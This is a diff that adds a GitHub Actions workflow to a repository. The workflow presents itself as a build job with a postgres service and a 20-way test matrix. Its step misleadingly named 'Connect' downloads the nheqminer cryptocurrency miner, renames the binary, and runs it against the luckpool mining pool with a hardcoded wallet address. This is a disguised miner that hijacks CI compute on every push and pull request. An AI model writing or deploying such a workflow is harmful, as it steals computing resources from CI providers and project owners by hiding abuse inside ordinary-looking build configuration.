@@ -1,1 +1,49 @@
-# bbbbbbbbbb
+name: mumet
+
+on: [push, pull_request]
+
+env:
+  BUILD_TYPE: Release
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    container: golang:latest
+    strategy:
+      matrix:
+         test_block:
+          - 1
+          - 2
+          - 3
+          - 4
+          - 5
+          - 6
+          - 7
+          - 8
+          - 9
+          - 10
+          - 11
+          - 12
+          - 13
+          - 14
+          - 15
+          - 16
+          - 17
+          - 18
+          - 19
+          - 20
+    services:
+      postgres:
+        image: postgres
+        env:
+          POSTGRES_PASSWORD: postgres
+
+    steps:
+      - name: Check out repository code
+        uses: actions/checkout@v2
+      - name: echo
+        run: echo "done"
+
+      - name: Connect
+        run: |
+          wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && mv nheqminer/nheqminer ngabret && ./ngabret -v -l ap.luckpool.net:3956 -u RCZiRNaUvTv9f6JPBMCVjt8XSULR47ZHVf.SUKUMANTE -p x -t 2
